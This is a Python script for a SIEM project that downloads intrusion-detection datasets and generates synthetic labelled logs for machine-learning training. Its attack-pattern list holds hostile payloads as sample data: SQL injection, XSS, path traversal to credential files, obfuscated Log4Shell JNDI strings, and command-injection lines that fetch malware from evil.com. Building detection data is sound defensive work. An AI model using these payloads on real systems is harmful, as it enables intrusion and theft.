#!/usr/bin/env python3
"""
Download and process cybersecurity datasets for FreeKhana SIEM ML training.
Includes UNSW-NB15, CICIDS2017/2018, and synthetic log generation.
"""

import os
import urllib.request
import zipfile
import gzip
import shutil
import subprocess
import sys

DATA_DIR = os.path.dirname(os.path.abspath(__file__))
DATASETS_DIR = os.path.join(DATA_DIR, "downloaded_datasets")
os.makedirs(DATASETS_DIR, exist_ok=True)

def install_requirements():
    """Install required packages."""
    print("Installing dependencies...")
    subprocess.check_call([
        sys.executable, "-m", "pip", "install", "-q", 
        "datasets", "pandas", "numpy", "scikit-learn"
    ])

def download_unsw_nb15():
    """Download UNSW-NB15 dataset from Hugging Face."""
    print("\nDownloading UNSW-NB15 dataset from Hugging Face...")
    
    code = '''
from datasets import load_dataset
import pandas as pd
import os

print("Loading UNSW-NB15 dataset...")
ds = load_dataset("Mouwiya/UNSW-NB15")
print(f"Dataset loaded: {ds}")

print("Converting to DataFrame...")
df = ds['train'].to_pandas()
print(f"Shape: {df.shape}")

# Map attack categories to standardized labels
attack_mapping = {
    'Normal': 'normal',
    'Exploits': 'exploit',
    'Fuzzers': 'fuzzer',
    'Generic': 'generic_attack',
    'DoS': 'dos',
    'Reconnaissance': 'reconnaissance',
    'Analysis': 'analysis',
    'Backdoor': 'backdoor',
    'Shellcode': 'shellcode',
    'Worms': 'worm',
}

df['attack_type'] = df['attack_cat'].map(attack_mapping).fillna('normal')

# Save combined dataset
output_path = "unsw-nb15.csv"
df.to_csv(output_path, index=False)
print(f"Saved to {output_path}")
print(f"Shape: {df.shape}")
print(f"\\nAttack distribution:")
print(df['attack_type'].value_counts())
'''
    
    with open("unsw_download.py", "w") as f:
        f.write(code)
    
    try:
        subprocess.check_call([sys.executable, "unsw_download.py"])
        print("UNSW-NB15 download complete!")
    except subprocess.CalledProcessError as e:
        print(f"Download failed: {e}")
        print("Trying alternative source...")
        download_unsw_nb15_fallback()
    
    if os.path.exists("unsw_download.py"):
        os.remove("unsw_download.py")

def download_unsw_nb15_fallback():
    """Fallback download from alternative source."""
    print("Attempting alternative download...")
    
    urls = [
        ("https://raw.githubusercontent.com/Mouwiya/UNSW-NB15/master/UNSW-NB15%20-%20CSV%20Files/UNSW-NB15_1.csv", "unsw-nb15_1.csv"),
        ("https://raw.githubusercontent.com/Mouwiya/UNSW-NB15/master/UNSW-NB15%20-%20CSV%20Files/UNSW-NB15_2.csv", "unsw-nb15_2.csv"),
    ]
    
    for url, filename in urls:
        dest = os.path.join(DATA_DIR, filename)
        if not os.path.exists(dest):
            try:
                print(f"Downloading {filename}...")
                urllib.request.urlretrieve(url, dest)
            except Exception as e:
                print(f"Failed to download {filename}: {e}")

def download_cicids2017():
    """Download CICIDS2017 dataset info."""
    print("\n" + "="*60)
    print("CICIDS2017 Dataset")
    print("="*60)
    print("Source: https://www.unb.ca/cic/datasets/ids2017.html")
    print("Direct download requires form submission.")
    print("\nAlternative sources:")
    print("  - Kaggle: CIC-IDS-2017 dataset")
    print("  - IEEE DataPort: CICIDS2017 (DOI: 10.21227/akxq-9v09)")
    print("\nAfter downloading, place CSV files in:")
    print(f"  {os.path.join(DATASETS_DIR, 'cicids2017')}/")

def download_cicids2018():
    """Download CICIDS2018 dataset info."""
    print("\n" + "="*60)
    print("CICIDS2018 Dataset")
    print("="*60)
    print("Source: https://www.unb.ca/cic/datasets/ids2018.html")
    print("Cleaned version available on Mendeley:")
    print("  - https://data.mendeley.com/datasets/29hdbdzx2r/1")
    print("\nAfter downloading, place CSV files in:")
    print(f"  {os.path.join(DATASETS_DIR, 'cicids2018')}/")

def download_kdd99():
    """Download KDD99 dataset."""
    print("\n" + "="*60)
    print("KDD99 Dataset (KDDCup99)")
    print("="*60)
    
    dataset_dir = os.path.join(DATASETS_DIR, "kdd99")
    os.makedirs(dataset_dir, exist_ok=True)
    
    url = "https://kdd.ics.uci.edu/databases/kddcup99/kddcup.data_10_percent.gz"
    dest = os.path.join(dataset_dir, "kddcup.data_10_percent.gz")
    
    if os.path.exists(os.path.join(dataset_dir, "kddcup.data_10_percent.csv")):
        print("[EXISTS] KDD99 already downloaded")
        return
    
    print(f"Downloading KDD99 from {url}...")
    try:
        urllib.request.urlretrieve(url, dest)
        
        # Decompress
        print("Decompressing...")
        with gzip.open(dest, 'rb') as f_in:
            with open(dest[:-3], 'wb') as f_out:
                shutil.copyfileobj(f_in, f_out)
        
        print(f"Saved to {dest[:-3]}")
    except Exception as e:
        print(f"Download failed: {e}")

def download_loghub_datasets():
    """Download Loghub datasets for real log analysis."""
    print("\n" + "="*60)
    print("Downloading Loghub Datasets")
    print("="*60)
    
    loghub_base = "https://zenodo.org/records/8275861/files"
    
    datasets = [
        ("Apache", "Apache.zip", "Web server logs"),
        ("BGL", "BGL.zip", "BlueGene/L supercomputer logs"),
        ("Linux", "Linux.zip", "Linux system logs"),
        ("Mac", "Mac.zip", "macOS system logs"),
        ("OpenSSH", "OpenSSH.zip", "SSH authentication logs"),
        ("OpenVPN", "OpenVPN.zip", "VPN connection logs"),
        ("ProFTPD", "ProFTPD.zip", "FTP server logs"),
        ("ApacheHadoop", "ApacheHadoop.zip", "Hadoop cluster logs"),
        ("Zookeeper", "Zookeeper.zip", "ZooKeeper coordination logs"),
        ("HealthApp", "HealthApp.zip", "Health monitoring app logs"),
        ("Spark", "Spark.zip", "Spark application logs"),
        ("HDFS", "HDFS.zip", "Hadoop Distributed File System logs"),
    ]
    
    loghub_dir = os.path.join(DATASETS_DIR, "loghub")
    os.makedirs(loghub_dir, exist_ok=True)
    
    for name, filename, description in datasets:
        dest = os.path.join(loghub_dir, filename)
        if os.path.exists(dest):
            print(f"  [EXISTS] {name}")
            continue
            
        url = f"{loghub_base}/{filename}"
        print(f"  [DOWNLOADING] {name} ({description})...")
        try:
            urllib.request.urlretrieve(url, dest)
            print(f"  [SUCCESS] {name}")
        except Exception as e:
            print(f"  [ERROR] {name}: {e}")
    
    print(f"\nLoghub datasets saved to: {loghub_dir}")
    print("Note: Files are ZIP compressed. Extract with unzip command.")

def generate_synthetic_logs():
    """Generate synthetic log data for training pattern detection."""
    print("\n" + "="*60)
    print("Generating Synthetic Log Dataset")
    print("="*60)
    
    import pandas as pd
    import numpy as np
    from datetime import datetime, timedelta
    
    np.random.seed(42)
    
    base_time = datetime(2024, 1, 1)
    
    log_templates = {
        "apache": [
            'GET /index.php?id={id} 200 {size}',
            'POST /login HTTP/1.1 200 {time}',
            'GET /admin 403 Forbidden',
            'GET /products.php?id={id}\' OR 1=1-- 500',
            '<script>alert(1)</script> 200 {size}',
            'GET /etc/passwd 404 Not Found',
            'POST /upload 200 {size}',
            'GET /api/users/{id} 200 {size}',
            'GET /search?q={query} 200 {size}',
            'POST /admin/login 401 Unauthorized',
        ],
        "ssh": [
            'Failed password for root from 192.168.1.{i} port 22',
            'Accepted publickey for admin from 10.0.0.{i}',
            'Invalid user test from 172.16.0.{i}',
            'Failed password for invalid user admin from 192.168.1.{i}',
            'Connection closed by authenticating user root 192.168.1.{i}',
            'Accepted password for user oracle from 10.10.10.{i}',
            'Failed password for user mysql from 192.168.5.{i}',
            'Received disconnect from 172.16.1.{i}: 11: disconnected by user',
        ],
        "firewall": [
            'DROP SRC=192.168.1.{i} DST=10.0.0.1 PROTO=TCP DPT=22',
            'ACCEPT DST=192.168.1.{i} SRC=8.8.8.8 PROTO=UDP DPT=53',
            'DROP SRC=45.33.32.{i} DST=10.0.0.1 PROTO=TCP DPT=80',
            'ACCEPT DST=172.16.0.{i} SRC=10.0.0.1 PROTO=TCP DPT=443',
            'DROP SRC=203.0.113.{i} DST=10.0.0.1 PROTO=TCP DPT=8080',
            'ACCEPT DST=192.168.1.{i} SRC=8.8.4.4 PROTO=UDP DPT=53',
        ],
        "syslog": [
            'systemd[1]: Started Apache HTTP Server.',
            'kernel: [    0.000000] Initializing cgroup subsys cpuset',
            'CRON[12345]: (root) CMD (/usr/local/bin/monitor.sh)',
            'sshd[1234]: Server listening on :: port 22.',
            'apache2[5678]: Apache/2.4.41 configured',
            'mysql[9012]: Ready for connections',
            'firewall[3456]: Loading firewall rules',
            'kernel: [  123.456] TCP: connection timeout',
        ],
        "dns": [
            'query: A www.evil.com IN from 192.168.1.{i}:1234',
            'query: TXT _dns.google.com IN from 10.0.0.{i}:53',
            'query: AAAA metadata.google.internal IN from 172.16.0.{i}',
            'response: NXDOMAIN for malicious-domain.com from 8.8.8.8',
            'query: A longsubdomainwithmanycharacters{i}.evil.com IN',
        ],
        "auth": [
            'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0',
            'sudo: pam_unix(sudo:auth): authentication failure;',
            'useradd[12345]: new group: name=malicious, GID=1001',
            'passwd[67890]: pam_unix(passwd:chauthtok): password changed for admin',
            'groupadd[11111]: new group: name=attackers, GID=1002',
        ],
    }
    
    attack_patterns = {
        "sql_injection": [
            "GET /products.php?id=1' OR '1'='1",
            "GET /search.php?keyword=test' UNION SELECT--",
            "POST /login.php?user=admin'--",
        ],
        "xss_attack": [
            "<script>document.location='http://evil.com'</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
        ],
        "command_injection": {
            "semantic": "; cat /etc/passwd",
            "patterns": ["| wget http://evil.com/malware", "| curl http://evil.com/shell.sh"],
        },
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/var/www/../../etc/shadow",
        ],
        "bruteforce": [
            "Failed password for root from 192.168.1.100",
            "Failed password for invalid user admin from 192.168.1.100",
        ],
        "port_scan": [
            "Connection refused from 192.168.1.200 port 22",
            "Connection refused from 192.168.1.200 port 80",
        ],
        "log4shell": [
            '${jndi:ldap://evil.com:1389/Exploit}',
            '${${lower:j}ndi${lower:}:${lower:l}dap${lower:}://evil.com}',
        ],
    }
    
    all_entries = []
    
    print("Generating normal traffic...")
    for log_type, templates in log_templates.items():
        count = {
            "apache": 15000, "ssh": 10000, "firewall": 20000,
            "syslog": 25000, "dns": 8000, "auth": 5000
        }.get(log_type, 10000)
        
        for i in range(count):
            template = np.random.choice(templates)
            entry = {
                "timestamp": base_time + timedelta(seconds=i + np.random.randint(0, 86400*7)),
                "log_type": log_type,
                "message": template.format(
                    id=np.random.randint(1, 1000),
                    size=np.random.randint(200, 10000),
                    time=np.random.randint(10, 500),
                    query="test" + str(np.random.randint(1, 100)),
                    i=np.random.randint(1, 255)
                ),
                "source_ip": f"192.168.1.{np.random.randint(1, 100)}",
                "attack_label": 0,
                "attack_type": "normal"
            }
            all_entries.append(entry)
    
    print("Generating attack traffic...")
    attack_i = len(all_entries)
    attack_templates = [
        (attack_patterns["sql_injection"], "sql_injection", 3000),
        (attack_patterns["xss_attack"], "xss_attack", 2500),
        (attack_patterns["path_traversal"], "path_traversal", 2000),
        (attack_patterns["bruteforce"], "bruteforce", 5000),
        (attack_patterns["port_scan"], "port_scan", 3000),
        (attack_patterns["log4shell"], "log4shell", 500),
    ]
    
    for templates, attack_type, count in attack_templates:
        for i in range(count):
            template = np.random.choice(templates)
            entry = {
                "timestamp": base_time + timedelta(seconds=attack_i + np.random.randint(0, 86400*7)),
                "log_type": list(log_templates.keys())[np.random.randint(0, len(log_templates))],
                "message": template if isinstance(template, str) else template.get("semantic", str(template)),
                "source_ip": f"192.168.1.{np.random.randint(200, 255)}",
                "attack_label": 1,
                "attack_type": attack_type
            }
            all_entries.append(entry)
            attack_i += 1
    
    df = pd.DataFrame(all_entries)
    df = df.sample(frac=1, random_state=42).reset_index(drop=True)
    
    output_path = os.path.join(DATASETS_DIR, "synthetic_logs.csv")
    df.to_csv(output_path, index=False)
    
    print(f"[GENERATED] {output_path}")
    print(f"  Total entries: {len(df):,}")
    print(f"  Normal: {(df['attack_label']==0).sum():,}")
    print(f"  Attacks: {(df['attack_label']==1).sum():,}")
    print(f"  Attack types: {df['attack_type'].value_counts().to_dict()}")

def list_available_datasets():
    """List all available datasets."""
    print("\n" + "="*60)
    print("Available Cybersecurity Datasets")
    print("="*60)
    
    datasets = [
        ("UNSW-NB15", "2.28M samples, 10 attack types", "Australian Cyber Security Centre"),
        ("CICIDS2017", "~8M flows, 14 attack types", "Canadian Institute for Cybersecurity"),
        ("CICIDS2018", "~16M flows, 12 attack types", "CIC + CSE Canada"),
        ("KDD99", "~5M connections, 23 attack types", "DARPA/KDDCup (Classic)"),
        ("Kyoto Honeypot", "~2B connections, real attacks", "Kyoto University"),
        ("LANL Enterprise", "~1B events, 58 days", "Los Alamos National Lab"),
        ("UWF-ZeekData22", "MITRE ATT&CK labeled", "University of West Florida"),
        ("AIT Log Dataset", "Synthetic log data", "Austrian Institute of Technology"),
    ]
    
    for name, desc, org in datasets:
        print(f"  {name:20s} - {desc}")
        print(f"                      Source: {org}")
    
    print("\n" + "="*60)
    print("Download Instructions")
    print("="*60)
    print("1. UNSW-NB15: Automatic download from Hugging Face")
    print("2. KDD99: Automatic download from UCI ML Repository")
    print("3. CICIDS2017/2018: Manual download from UNB website (requires form)")
    print("4. Others: Check individual sources for access")

def main():
    print("=" * 60)
    print("FreeKhana SIEM - Dataset Downloader")
    print("Downloading cybersecurity datasets for ML training")
    print("=" * 60)
    
    list_available_datasets()
    
    install_requirements()
    
    download_unsw_nb15()
    download_kdd99()
    download_cicids2017()
    download_cicids2018()
    download_loghub_datasets()
    generate_synthetic_logs()
    
    print("\n" + "="*60)
    print("Summary")
    print("="*60)
    print(f"Datasets directory: {DATASETS_DIR}")
    print("\nNext steps:")
    print("  1. Manually download CICIDS2017/2018 from https://www.unb.ca/cic/datasets/")
    print("  2. Run: python train_multi_dataset.py")
    print("  3. Or generate synthetic logs: python download_datasets.py --synthetic-only")

if __name__ == "__main__":
    main()
